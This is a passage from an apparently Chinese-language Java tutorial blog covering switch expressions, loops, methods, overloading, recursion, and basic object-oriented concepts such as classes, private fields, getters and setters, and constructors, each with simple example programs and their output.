    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        String data = &quot;one&quot;;
        int result = switch (data){
            case &quot;one&quot; : yield 1 ;
            case &quot;two&quot; : yield 2 ;
            default :{
                yield -1;
                } 
        };
        System.out.println(result);
    }
}</code></pre><blockquote>
<p>1</p>
</blockquote>
<p>*　　以上的做法实际上是局部的switch返回的简化的处理形式，如果现在不想使用“-&gt;”标记符号组合，就可以通过yield关键字来处理了*</p>
<p><strong>该程序的机制实际上并没有完全的加入到java的正规使用的环境之中，还只是一种当前现阶段的测试应用环境，如果要想使用这样的功能就必须在编译和执行的时候追加“–enable-preview”参数</strong></p>
<pre><code>知识结构扩展：python语言里面有yield关键字
    |-在python中的yield也是实现了局部返回，但是它在进行局部返回的时候可以结合生成器和多协程开发进行操作。</code></pre><h1 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h1><pre><code>在java里面循环的结构分为两类：while循环、for循环，这两种循环在实际的项目开发过程之中基本上都要使用到，而且循环的结构几乎所有的项目中全部都存在。</code></pre><h2 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h2><pre><code>while 是一种条件判断的循环处理，它主要是针对于给定的条件，当条件满足之后才会执行。</code></pre><p><strong>范例：实现”1-100”数字累加</strong></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        int sum = 0 ;
        int num = 1 ;
        while (num &lt;= 100) 
        {
            sum +=num;
            num ++ ;
        }
        System.out.println(&quot;sum=&quot;+sum);
    }
}</code></pre><blockquote>
<p>sum=5050</p>
</blockquote>
<p>public class DongJun{<br>    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示<br>    public static void main(String DongJun[]){<br>        int sum = 0 ;<br>        int num = 1 ;<br>        do<br>        {<br>            sum +=num;<br>            num++ ;<br>        }<br>        while(num&lt;=100);<br>        System.out.println(“sum=”+sum);<br>    }<br>}</p>
<blockquote>
<p>sum = 5050</p>
</blockquote>
<pre><code>如果真的在实际的项目开发过程之中，很难见到“do……while”循环结构，在代码里面基本上只要条件的循环都以while循环结构为主。</code></pre><h2 id="for循环结构"><a href="#for循环结构" class="headerlink" title="for循环结构"></a>for循环结构</h2><pre><code>如果说你已经明确知道了循环次数的时候，就可以通过for循环结构更加简单的进行循环处理，首先来观察一下for循环的语法结构
|-
  for(循环初始化条件 ; 循环判断 ; 循环条件变更){
    循环体;
  }

      可以发现在for语句结构里，将所有的循环有关的操作全部放在了一行语句完成。</code></pre><p><em>范例：使用for循环</em></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        int sum = 0;
        for (int num = 1; num &lt;= 100 ; num ++ )
        {
            sum += num;
        }
        System.out.println(&quot;sum=&quot;+sum);
        }
}</code></pre><blockquote>
<p>sum = 5050</p>
</blockquote>
<p>**　　需要特别引起注意的一件事情在于：对于for循环结构实际上可以拆开编写，但是在实际的开发过程中不建议如此定义**<br><strong>范例：不便方式</strong><br>public class DongJun{<br>    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示<br>    public static void main(String DongJun[]){<br>        int sum = 0;<br>        int num = 1;<br>        for (; num &lt;= 100 ; )<br>        {<br>            sum += num;<br>            num ++ ;<br>        }<br>        System.out.println(“sum=”+sum);<br>        }<br>}</p>
<blockquote>
<p>以上的程序代码在实际上开发中不建议使用</p>
</blockquote>
<pre><code>while循环：当不知道明确的循环次数，但是却明确知道循环的结束条件的情况下可以使用while循环；
for循环：明确的知道循环次数的时候使用。</code></pre><h2 id="循环控制语句"><a href="#循环控制语句" class="headerlink" title="循环控制语句"></a>循环控制语句</h2><pre><code>在正常的情况下，所有的循环一旦开启了，那么肯定会按照既定的原则持续的执行下去（一直到不满足循环条件为止，循环才会自动的退出），但是在某些情况下，有可能会阻塞循环的执行。
针对于中断执行提供有两个关键字：continue、break;</code></pre><p><strong>结论：continue结束一次循环调用，而break是退出整个循环结构</strong></p>
<h2 id="循环嵌套"><a href="#循环嵌套" class="headerlink" title="循环嵌套"></a>循环嵌套</h2><pre><code>大部分的结构都是可以嵌套的，例如：在switch里面可以继续嵌套循环或者是if语句，在循环结构里面也可以嵌套if结构，那么同期，一个循环内部也一定可以嵌套另外一个循环。</code></pre><blockquote>
<p>**　　关于循环嵌套的提醒：只要你能够编写循环，就可以正常的向后学习课程内容。**</p>
</blockquote>
<p><strong>范例：打印乘法口诀表</strong></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        for (int x = 1; x &lt;= 9  ; x ++ )
        {
            for (int y = 1; y &lt;= x ; y ++)
            {
                System.out.print(y+&quot;*&quot;+x+&quot;=&quot;+(x*y)+&quot;\t&quot;);
            }
            System.out.println();
        }
    }
}</code></pre><blockquote>
</blockquote>
<p>1<em>1=1<br>1</em>2=2   2<em>2=4<br>1</em>3=3   2<em>3=6   3</em>3=9<br>1<em>4=4   2</em>4=8   3<em>4=12  4</em>4=16<br>1<em>5=5   2</em>5=10  3<em>5=15  4</em>5=20  5<em>5=25<br>1</em>6=6   2<em>6=12  3</em>6=18  4<em>6=24  5</em>6=30  6<em>6=36<br>1</em>7=7   2<em>7=14  3</em>7=21  4<em>7=28  5</em>7=35  6<em>7=42  7</em>7=49<br>1<em>8=8   2</em>8=16  3<em>8=24  4</em>8=32  5<em>8=40  6</em>8=48  7<em>8=56  8</em>8=64<br>1<em>9=9   2</em>9=18  3<em>9=27  4</em>9=36  5<em>9=45  6</em>9=54  7<em>9=63  8</em>9=72  9*9=81</p>
<p><strong>此时的程序利用循环嵌套实现</strong></p>
<p><strong>范例：打印正三角形</strong></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        int line  = 5 ;//总共输出5行
        for (int x=0 ; x &lt;5 ; x ++)
        {
            for (int y=0 ;y &lt; line - x; y++ )
            {
                System.out.print(&quot; &quot;);//输出空格
            }
            for (int y=0; y &lt;= x  ; y++ )
            {
                System.out.print(&quot;* &quot;);
            }
            System.out.println();
        }

    }
}</code></pre><blockquote>
</blockquote>
<pre><code> *
* *</code></pre><hr>
<hr>
<hr>
<p> <strong>实现了三角形的打印</strong></p>
<pre><code>|- 在现在的项目开发过程里面，如果不是必须的情况下，这种循环的嵌套代码会出现，但是不会出现的很多，而且随着你自己开发经验的累计，那么最终也一定可以熟练掌握。
|- 既然已经存在循环嵌套结构，那么就必须去讨论一下关于continue语句的问题了，在程序的开发语言里面可以发现“C”、“C++”、“Java”语法的结构都是非常类似，在C语言里面提供有了一个“goto”关键字，这种关键字在所有项目开发中都被命令禁止使用的开发关键字，因为会造成程序逻辑结构的混乱，在Java里面将“goto”关键字定义为了未使用到的关键字，如果此时在循环嵌套结构里面你非要进行一种代码跳转的实现，就可以通过continue来完成。</code></pre><p><em>范例：在循环嵌套结构里面使用continue进行跳转</em></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        point: for (int x = 0; x &lt;3 ; x ++ )
        {
            for (int y=0; y&lt; 3  ;  y++)
            {
                if (x == y)
                {
                    continue point;//代码跳转
                }
                System.out.print(x + &quot;、&quot;);
            }
            System.out.println();
        }
    }
}</code></pre><blockquote>
<p>1、2、2、</p>
</blockquote>
<pre><code>在内部的for循环嵌套结构里面使用了continue实现了无条件的跳转处理操作，所以最终的执行结果就出现了偏差，但是这样的程序逻辑是非常不适合阅读，所以以上的代码形式在开发中尽量不要出现</code></pre><h1 id="方法作用概述"><a href="#方法作用概述" class="headerlink" title="方法作用概述"></a>方法作用概述</h1><pre><code>方法（英文单词“method”）指的是一种可以被重复调用的代码段，如果完全没有学习过编程的概念你就把方法想象为一个功能。例如：只要你会开车，那么给你汽车你就可以直接开走（在你的开车的过程之中可能完全不知道汽车的工作原理）。</code></pre><h2 id="方法定义"><a href="#方法定义" class="headerlink" title="方法定义"></a>方法定义</h2><pre><code>在java里面由于方法是整个程序之中最为重要的结构，所以对于方法的定义本身也是非常繁琐的，为了方便大家理解本次讲解的方法结构，所以将采用如下的定义方式：
--------------------------------------------------------------
public static 方法返回值类型 方法名称（参数类型 变量， 参数类型 变量, ……）
{    
    方法体（本方法所需要实现的功能）;
    [return 返回值;]
}</code></pre><p><strong>特别注意：public static本次讲解的方法指的是主类中定义，并且由主方法直接调用的处理形式</strong></p>
<p><em>方法的定义格式：</em></p>
<blockquote>
<p>　　方法的返回值类型：主要使用的是java数据类型（基本类型、引用类型）、如果没有返回值就使用void定义；<br>　　方法名称在java之中有明确的命名要求：第一个单词的字母小写，而后每一个单词的首字母大写；<br>　　如果方法定义了非Void返回值类型，则可以通过return返回处理结果，如果使用了void，也可以使用return，就不需要返回具体的数据内容了</p>
</blockquote>
<p><strong>定义一个无参且无返回值的方法</strong></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        printMessage();
        printMessage();
    }
    public static void printMessage(){//第一个单词字母小写，后续单词首字母大写
        System.out.println(&quot;******************&quot;) ;
        System.out.println(&quot;******  DJ  ******&quot;) ;
        System.out.println(&quot;******************&quot;) ;
    }                                             
}</code></pre><blockquote>
</blockquote>
<hr>
<p><strong>**</strong>  DJ  <strong>**</strong></p>
<hr>
<hr>
<p><strong>**</strong>  DJ  <strong>**</strong></p>
<hr>
<p><strong>程序之中存在有方法之后，程序代码依旧要通过主方法执行</strong></p>
<p><em>范例：定义一个有参数有返回值的方法</em></p>
<p>public class DongJun{<br>    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示<br>    public static void main(String DongJun[]){<br>        String result = payAndGet(20.0);<br>        System.out.println(result);<br>        //如果方法本身就存在返回值声明，那么也可以直接进行输出<br>        System.out.println(payAndGet(9.9));</p>
<pre><code>}
public static String payAndGet(double money){
    if(money &gt;= 10.0){
        return &quot;购买一份快餐，找零：&quot;+ (money - 10.0);//返回一个字符串
    }
    else {
        return &quot;对不起，你的余额不足。&quot;;
        }
}                                             </code></pre><p>}</p>
<blockquote>
</blockquote>
<p>购买一份快餐，找零：10.0<br>对不起，你的余额不足。</p>
<p><strong>需要注意的一个问题：如果你现在定义的方法使用了void声明了返回值类型（方法不会返回数据），那么这个时候也可以利用return语句结束当前方法调用（此时的return不应该继续返回任何内容了）</strong></p>
<p><em>范例：使用return结束方法调用</em></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        sale(3);
        sale(-3);

    }
    public static void sale(int amount){
            if (amount &lt;= 0)//设置一个判断条件
            {
                return ;//后续的语句都不在执行了（相当于break、continue概念）
            }
            System.out.println(&quot;销售出了&quot;+amount+&quot;李兴华&quot;);
        }
    }                                             </code></pre><blockquote>
</blockquote>
<p>销售出了3李兴华</p>
<p><em>return相当于结束当前方法</em></p>
<h2 id="方法重载"><a href="#方法重载" class="headerlink" title="方法重载"></a>方法重载</h2><pre><code>方法重载从严格意义上来讲指的是一种方法名称的重用功能，利用特定的处理机制，可以让一个方法实现不同的功能。</code></pre><p>**　　在Java程序里面方法的名称实际上和变量的名称一样，都是不能够重复的，所以如果要进行方法重载的话，那么首先要做的事情就是必须将方法名称设置为相同，但是需要针对于方法的参数进行不同的定义，方法的参数及类型要有所不同。**</p>
<p><strong>范例：观察方法重载</strong></p>
<p>public class DongJun{<br>    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示<br>    public static void main(String DongJun[]){<br>        System.out.println(sum(10, 20));<br>        System.out.println(sum(10, 20, 30));<br>        System.out.println(sum(10.2, 20.3));<br>        }<br>    public static int sum(int x, int y) {<br>        return x + y;<br>    }<br>    public static int sum(int x, int y, int z)//此时定义的sum()方法的名称重复，但是参数的个数不重复<br>    {<br>        return x + y + z;<br>    }<br>    public static double sum(double x, double y) {<br>            return x + y;<br>            }<br>    }</p>
<blockquote>
</blockquote>
<p>30<br>60<br>30.5</p>
<p><em>对于以上的程序代码，本身也存在有一些设计问题</em></p>
<p>**　　在java中进行方法重载的时候只是针对于方法名称和参数的类型及个数有所要求，但是并没有对方法的返回值有所要求，也就是说一个方法被重载之后可以由不同的返回值类型定义，但是这也成为了一个设计上的问题。**</p>
<p><em>为什么需要有方法重载的机制呢？</em></p>
<blockquote>
<p><strong>之所以提供有方法的重载，主要的目的是为了保留方法名称（有些方法名称是拥有公共特征，不应该将其隶属于某一种数据类型）</strong><br>实际上在整个的java里面最具有代表性的一种重载的就属于输出的操作。</p>
</blockquote>
<p><em>范例：观察屏幕输出</em></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        System.out.println(1);
        System.out.println(1.1);
        System.out.println(&quot;www&quot;);
        System.out.println(&apos;Y&apos;);
        System.out.println(true);



    }
}        </code></pre><blockquote>
</blockquote>
<p>1<br>1.1<br>www<br>Y<br>true</p>
<p><strong>此时可以发现“System.out.println()”(后面有括号全部表示方法调用)可以输出不同的数据类型，所以该方法本身也属于一种重载的方法。</strong></p>
<h2 id="方法递归调用"><a href="#方法递归调用" class="headerlink" title="方法递归调用"></a>方法递归调用</h2><pre><code>方法的递归调用属于一种方法调用的特殊形式，这种方法调用指的是就是一个方法调用自身的情况，但是在进行递归调用过程之中一定要设置好结束条件，否则依然会出现循环的问题。</code></pre><p><strong>范例：通过递归实现一个数字的累加</strong><br>|- “1<del>100”累加，或者是由”1</del>1000”累加，所以这种情况下可以考虑利用递归的模式完成.</p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        int sum = 0;
        int num = 1000;
        while (num &gt; 0 )
        {
            sum += num;
            num --;
        }
        System.out.println(sum);

    }
}    

public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        int result = sum(1000);
        System.out.println(result);
    }
    public static int sum(int num) {
        if (num == 0) {
            return 0;
        }
         return num + sum(num - 1); //递归调用

    }
}                                             </code></pre><blockquote>
<p>500500</p>
</blockquote>
<p><strong>为了便于理解，下面针对于当前给定的sum()递归调用进行一个简单的操作说明：</strong></p>
<pre><code>    【第一次调用】由“main（）”方法发出：return 10000+sum(9999);
    【第二次调用】由“main（）”方法发出：return 9999+sum(9998);
    【倒数第二次调用】由“main（）”方法发出：return 1+sum(0);
    【倒数第二次调用】由“main（）”方法发出：return 0;
由于递归操作较为繁琐，而且一旦处理不当那么就有可能在代码的执行过程之中出现内存溢出的问题（需要一些栈内存支持），所以如果不是必须的情况下尽量不要去编写递归调用（在java开发过程里面实际上你也不会使用递归。）</code></pre><h1 id="面向对象概述"><a href="#面向对象概述" class="headerlink" title="面向对象概述"></a>面向对象概述</h1><pre><code>在整个的java（连同C++一样）最为复杂繁琐的部分就是面向对象的编程了，但是如果说现在我们都不知道面向对象的程序结构是什么，而仅仅是进行一些概念上的细分，实际上就属于极为不厚道的讲法。
在编程语言项目的发展历史过程之中，早期的项目设计结构使用的是“面向过程”，面向过程最大的特点是解决当前的问题。
而面向对象是在面向过程之上的进一步的技术发展，面向对象最大的一个特点在于进行标准化的设计，也就是说它在进行项目开发之前一定要对不同层次的功能的整合进行详细的说明。</code></pre><p>**　　面向对象的设计之中，除了拥有模块化的设计结构之外，实际上还有三个重要的特点：**</p>
<blockquote>
</blockquote>
<p>|- 封装性：程序内部的处理结构对外不可见（结构内部不可见、实现结构不可见）;<br>    - 实现结构不可见：不同的层之间进行处理的时候可以完全不知道具体的实现细节；<br>    - 内部结构不可见：内部的相关的核心定义外部无法直接访问，这就与访问权限相关了；<br>|- 继承性：在先人的基础上继续发展，就好比如果参考进化论，每一位人祖先都是猿人，肯定每一代都要比上一代要强，利用继承的结构划分出不同的类关系，同时保证一些公共的特征存留下来。<br>|- 多态性：多态是一种不确定的执行模式，同样的一个功能不同的人干会有不同的方法，但是最终的目的都是在解决核心的问题。</p>
<pre><code>面向对象之中会有许多更加细节化的概念，那么这些概念都需要时间慢慢沉淀，对于面向对象本身并不是世界上唯一使用编程模型，也有许多的开发者愿意使用面向过程或者函数式的编程，而java采用的是面向对象的开发，从本质上来讲这样的代码写起来有些难受（要求的语法结构非常细致），但是最大的特点是易于阅读。</code></pre><h2 id="类与对象"><a href="#类与对象" class="headerlink" title="类与对象"></a>类与对象</h2><pre><code>如果要想研究面向对象的编程技术，那么首先一定要明确的就是类与对象的关系，因为这个关系是整个面向对象编程之中基本组成单元，类描述的是一类事物的共同特征的集合（概念是不能够直接使用的），而对象描述的是一个体化拥有鲜明特点的实物。</code></pre><p>**　　在每一个类之中都会有相关的属性和行为（方法)，所谓的行为描述的就是类的功能，所有的对象都可以去调用类中定义的功能。**</p>
<blockquote>
<p><strong>在进行面向对象设计之中一定要先进行类结构的定义，而后才可以拥有具体的对象，对象是可以直接使用的操作；</strong><br><strong>一个类可以产生多个对象，不同的对象拥有各自不同的特点（属性），但是所有的对象都拥有相同的功能（方法）。</strong><br><em>|- 专业描述：类是对象共性的集合，而对象是类的实例，类必须依靠对象实例才可以使用。</em></p>
</blockquote>
<h2 id="类与对象的定义"><a href="#类与对象的定义" class="headerlink" title="类与对象的定义"></a>类与对象的定义</h2><pre><code>在之前所编写的所有的程序代码都是在一个类中进行程序的定义，在之前分析过了“public class”、&quot;class&quot;定义类的基本区别，实际上在java中程序类主要就是通过class关键字进行定义的，所以定义的基础语法结构如下）：
------------------------------------------------
class 类名称 { //遵守命名规则，每个单词的首字母大写
    [访问修饰符] 数据类型 成员属性（变量）;
    [访问修饰符] 数据类型 成员属性（变量）;
        ... ... ...
    [访问修饰符] 返回值类型 方法名称 （参数类型 参数1 ...）{
        本方法处理语句;
        [return [];]
    }
}
------------------------------------------------
一个类中可以同时定义多个成员属性（FIeld）、也可以定义多个方法（Method)，在进行属性定义前出现的“访问修饰符”最终的作用就是实现类的封装性的特点，本次针对于修饰符采用不定义（默认的形式），而方法中出现的访问修饰符统一使用“public”来进行描述。</code></pre><p><strong>范例：定义一个描述图书信息的类</strong></p>
<pre><code>|- 声明并实例化对象： 类名称 对象名称（变量） = new 类名称();
|- 进行分步定义，整个的操作分为两个处理阶段：
    - 声明对象：类名称 对象名称 = null（引用数据类型的默认值）；
    - 实例化对象： 对象名称 = new 类名称（）;</code></pre><blockquote>
<p><strong>当一个类已经产生了实例化对象之后肯定要对类结构进行操作，在java程序里面，对象可以通过两类语法形式使用类：<br>    |- 调用类中的成员属性（Field）：实例化对象.属性= 值；</strong><br>    |- 调用类中的方法（Method）：实例化对象.方法名称();</p>
</blockquote>
<p>范例：声明并实例化对象</p>
<pre><code>class Book
{
    //图书的名称肯定是多位字符
    String title;
    String author;
    //价格一定是一个小数，double的准确性高于float
    double price;
    public void getInfo() { //本次定义getInfo()方法过程之中可以发现没有使用最初讲解方法时的“static”关键字，在之前讲解方法时在主类中定义的，而现在在类中定义的方法主要通过对象来进行调用，所以此时暂时不加static，具体语法后续会有详细解释。
        System.out.println(&quot;图书名称：&quot;+ title + &quot;、图书作者：&quot; + author + &quot;、图书价格:&quot; + price);
    }
}

public class DongJun //主类
{
    public static void main(String avgs[]){
        Book book = new Book();
        book.title = &quot;我的&quot;;
        book.author = &quot;天啊&quot;;
        book.price = 89.6 ; 
        book.getInfo();
    }
}</code></pre><blockquote>
<p>图书名称：我的、图书作者：天啊、图书价格:89.6</p>
</blockquote>
<p><em>*　　此时的程序代码已经可以通过类产生的实例化对象进行类中结构的调用了，实例化对象一旦出现，类的结构就可以进行各种操作的，而本次的操作仅仅是进行了一些属性的设置以及方法的调用**<br>*观察属性默认值</em></p>
<pre><code>class Book
{
    //图书的名称肯定是多位字符
    String title;
    String author;
    //价格一定是一个小数，double的准确性高于float
    double price;
    public void getInfo() { //本次定义getInfo()方法过程之中可以发现没有使用最初讲解方法时的“static”关键字，在之前讲解方法时在主类中定义的，而现在在类中定义的方法主要通过对象来进行调用，所以此时暂时不加static，具体语法后续会有详细解释。
        System.out.println(&quot;图书名称：&quot;+ title + &quot;、图书作者：&quot; + author + &quot;、图书价格:&quot; + price);
    }
}

public class DongJun //主类
{
    public static void main(String avgs[]){
        Book book = new Book();
        book.getInfo();
    }
}</code></pre><blockquote>
<p>图书名称：null、图书作者：null、图书价格:0.0</p>
</blockquote>
<p>**　　现在程序仅仅是进行了book类对象的实例化处理，随后在没有进行属性设置的情况下立即调用getInfo()方法获取对象内容，通过结果可以发现title、author内容全部为null（String 是一个类，类是引用数据类型，默认值就是null）而price的默认值为“0.0”。**</p>
<pre><code>一个类与对象的基本概念已经讲述完毕，同时以上给出的语法结构实际上也属于实际开发过程之中的常规的操作形式了，但是为了帮助大家更好理解面向对象设计与之前概念的联系，下面利用面向对象的设计形式来实现一个正三角形的打印，而这个打印过程里面，将通过属性来保存打印的行数。</code></pre><p><strong>范例：面向对象设计的应用</strong></p>
<pre><code>class Triangle 
{
    int line = 5 ;
    public void paint() {
        for (int x = 0; x&lt; line ; x++)
        {
            for (int y = 0;  y&lt; line - x; y++ )
            {
                System.out.print(&quot; &quot;);
            }
            for (int y = 0 ;y &lt;= x ; y++ )
            {
                System.out.print(&quot;* &quot;);
            }
            System.out.println();
        }
    }
}
public class DongJun //主类
{
    public static void main(String avgs[]){
        Triangle tri = new Triangle();
        tri.line = 3;
        tri.paint();
    }
}</code></pre><blockquote>
</blockquote>
<p>   *</p>
<ul>
<li>*</li>
</ul>
<hr>
<p>**　　在之前实现此功能的时候要么就直接在主方法里面进行定义，要么就直接定义有一个方法进行调用，但是现在将与这个图形有关的成员属性（变量）和操作方法混合定义在了一个“Triangle”类里面，从代码管理来讲，结构是非常清晰的。**</p>
<h2 id="对象内存分析"><a href="#对象内存分析" class="headerlink" title="对象内存分析"></a>对象内存分析</h2><pre><code>在之前已经为大家讲解过了整个java之中的数据类型划分，而对于数据类型的划分，在Java里面分为两类：基本数据类型（数值的传递操作）、引用数据类型（内存地址的传递，这种引用传递就类似于C、C++之中的指针的概念）</code></pre><p>**　　所有的数据都要保存在内存之中，但是如何可以准确的获取数据，就称为了计算机操作系统本身需要解决的问题，那么经过了长期的发展之后，人们发现应该将内存的功能分为两个部分：**</p>
<blockquote>
</blockquote>
<p>|- 【heap】 堆内存：是保存对象的真实信息；<br>|- 【stack】栈内存：保存的是对象的堆内存的地址；</p>
<blockquote>
<p><strong>对于所有的内存的操作实际上每一位开发者是完全不知情的，所有与内存分配有关的任何操作全部都是由JVM负责完成的，不同的操作系统之中内存分配机制肯定也是不同的，那么最终全部由JVM进行分配</strong></p>
</blockquote>
<pre><code>如果要想进行对象属性或方法的操作，一定要保证存在有实例化对象（开辟了堆内存的对象、或者有堆指向的实例）</code></pre><h2 id="引用传递分析"><a href="#引用传递分析" class="headerlink" title="引用传递分析"></a>引用传递分析</h2><pre><code>Java之中引用数据类型需要内存的支持，所以在进行程序开发的过程之中，内存是可以有多个指向，内存的多个指向指的是不同的栈内存可以指向同一个堆内存。</code></pre><h2 id="垃圾产生分析"><a href="#垃圾产生分析" class="headerlink" title="垃圾产生分析"></a>垃圾产生分析</h2><pre><code>在Java语言里面有一个最为重要的技术特点：垃圾回收（Garbage Collector），所有的数据都要保存在内存之中，但是内存里面也是需要进行顺序式的空间分配，如果要想非常深入的去理解垃圾回收的相关操作，那么就需要先明白垃圾是什么？如何产生的，随后才可以进一步的优化
Java提供有自动的GC回收机制，但是如果你的程序之中产生的垃圾过多，那么也会造成硬件性能的损耗，从而导致程序的执行性能下降，所以最佳的做法是避免垃圾的产生。</code></pre><h2 id="成员属性的私有化"><a href="#成员属性的私有化" class="headerlink" title="成员属性的私有化"></a>成员属性的私有化</h2><pre><code>|- 在面向对象的设计之中有三大主要特征（封装、继承、多态），封装是在面向对象设计之中最为常见的一种概念，但是如果要思想把封装的所有概念都弄明白，则还需要充分的理解继承与多态，本次所讲解的成员属性私有化就是封装的一种基础实现。
|- 按照一般程序的设计思路来讲，如果要想使用类肯定要通过对象，类中一般会提供有属性和方法，那么不同的对象可以进行属性的操作，传统的做法是直接在类的外部由实例化对象直接进行属性的操作。</code></pre><p><strong>范例：使用private关键字定义类中属性</strong></p>
<pre><code>class Book
{
    private String title;
    private String author;
    private double price;
    public void getInfo(){
        System.out.println(&quot;图书标题：&quot;+ title + &quot;\n图书作者：&quot;+ author +&quot;\n图书价格：&quot;+ price);
    }
}
public class DongJun //主类
{
    public static void main(String avgs[]){
        Book book = new Book();
        book.title = &quot;成长日记&quot;;
        book.author = &quot;董俊&quot;;
        book.price = 99.9; 
        book.getInfo();



    }
}</code></pre><blockquote>
</blockquote>
<p>DongJun.java:14: 错误: title 在 Book 中是 private 访问控制<br>                book.title = “成长日记”;<br>                    ^<br>DongJun.java:15: 错误: author 在 Book 中是 private 访问控制<br>                book.author = “董俊”;<br>                    ^<br>DongJun.java:16: 错误: price 在 Book 中是 private 访问控制<br>                book.price = 99.9;</p>
<p><strong>使用private关键字定义类中属性所以无法访问</strong></p>
<pre><code>使用了private外部的对象无法直接访问了，但是类的内部是可以进行访问的，于是如果要想进行private私有属性的访问操作，按照Java本身定义规则来讲，就需要编写setter、getter方法来完成 
|- stter：进行属性内容的设置，基本形式:
-------------------------------------------
public void set 属性名称(属性类型 变量){ 属性名称 = 变量}
private String title;
public void setTitle(String t){
    title = t;    
}
|- getter：获取属性内容：基本的形式：
--------------------------------------
public 属性类型 get属性名称(){
    return 属性名称;
}
public String getTitle(){
    return title;
}</code></pre><p><em>你的类中不管有多少属性都需要编写与之匹配的setter、getter</em>的方法的个数，而且这种编写的设计结构是所有的Java后续开发之中都一定会使用的模式。</p>
<p><strong>范例：观察private属性访问</strong></p>
<p>class Book<br>{<br>    private String title;<br>    private String author;<br>    private double price;<br>    public void setTitle(String t){<br>        title = t;<br>    }<br>    public void setAuthor(String a){<br>        author = a;<br>    }<br>    public void setPrice(double p)<br>    {<br>        price = p;<br>    }<br>    public String getTitle(){<br>        return title;<br>    }<br>    public String getAuthor(){<br>        return author;<br>    }<br>    public double getPrice()<br>    {<br>        return price;<br>    }</p>
<p>}<br>public class DongJun //主类<br>{<br>    public static void main(String avgs[]){<br>        Book book = new Book();<br>        book.setTitle(“我行得正”);<br>        book.setAuthor(“做的好”);<br>        book.setPrice(88);<br>        System.out.println(“图书名：”+book.getTitle()+book.getAuthor()+book.getPrice());<br>    }<br>}</p>
<blockquote>
</blockquote>
<p>图书名：我行得正做的好88.0</p>
<pre><code>在日后整个程序的开发过程之中，只要编写类中的属性一定要使用private进行声明，而private声明的属性必须要与之匹配的setter、getter方法才可以被外部所访问，即便当前的代码里面没有调用全部方法，但是作为一个标准类的功能这些方法都是必须提供出来的。</code></pre><h2 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h2><pre><code>构造方法是Java类之中的一种特殊形式的操作方法，其调用的时机是在对象实例化的时候（堆内存开辟的时候进行调用），下面首先来观察一下构造方法的基本形式；</code></pre><p><strong>范例：观察构造方法</strong></p>
<pre><code>class Book
{
    public Book(){//构造方法
        System.out.println(&quot;******董俊来*******&quot;);
    }
}
public class DongJun
{
    public static void main(String args[])
    {
        System.out.println(&quot;【1】声明book类对象：“Book book = null; ”&quot;);
        Book book = null; 
        System.out.println(&quot;【2】实例化book类对象:“book = new Book();”&quot;);
        book = new Book();//实例化对象
    }
}</code></pre><blockquote>
<p>【1】声明book类对象：“Book book = null; ”<br>【2】实例化book类对象:“book = new Book();”</p>
</blockquote>
<p><strong>在整个程序执行过程之中，真正进行构造方法调用的位置处就是使用关键字“new”实例化对象的时候，实际上对于此时的操作，Book类中就定义了构造方法，但是对于构造方法本身是有其非常严格的定义要求的：</strong></p>
<pre><code>|- 构造方法的方法名称不能够任意编写，必须与类名称保持一致；
    - 此时定义的类是类名称是Book,而构造方法的名称使用的是“public Book(){}”;
|- 构造方法没有返回值声明，并且不能够返回任何的数据内容;
|- 一个类之中如果没有定义任何的构造方法，则会在程序编译的时候自动由JDK生成一个无参的构造方法。</code></pre><p><em>构造方法在现实中的应用；</em></p>
<pre><code>|- 构造方法是在使用关键字new的时候才会被调用，而且一个对象只会执行一次构造操作，就好比一个人只能出生一次;
|- 如果现在类中没有通过构造方法进行属性内容的设置，那么就意味着整个的程序在对象实例化之后所有的成员属性都是默认值，那么就需要一步一步的进行属性的配置，就好比书先封装好了，随后再往里面填充内容，最终形成成品。</code></pre><blockquote>
<p>　　<strong>如果现在一个类种即要求有参构造也要求提供无参构造的时候后，唯一可以使用的方法就是通过方法的重载形式来完成，但是需要注意的是，此时只需要考虑方法的参数类型及个数即可（因为构造方法的名称和类名称是完全相同的）</strong></p>
</blockquote>
<p><strong>观察方法的重载</strong></p>
<pre><code>class Book
{
    private String title;
    private String author;
    private double price;
    public Book(){}
    public Book(String t){
        this.setTitle(t);
        this.setAuthor(&quot;沐言优拓&quot;);
        this.setPrice(90.1);
    }
    public Book(String t, String a, double p)
    {
        setTitle(t);
        this.setAuthor(a);
        setPrice(p);
    }
    public void getInfo(){
        System.out.println(&quot;图书标题：&quot;+ title + &quot;\n图书作者：&quot;+ author +&quot;\n图书价格：&quot;+ price);
    }
    public void setTitle(String t){
        title = t;
    }
    public void setAuthor(String a){
        author = a;
    }
    public void setPrice(double p){
        price = p;
    }

}
public class DongJun //主类
{
    public static void main(String avgs[]){
        Book book = new Book(&quot;董俊&quot;,&quot;2&quot;,89.0);
        book.getInfo();
    }
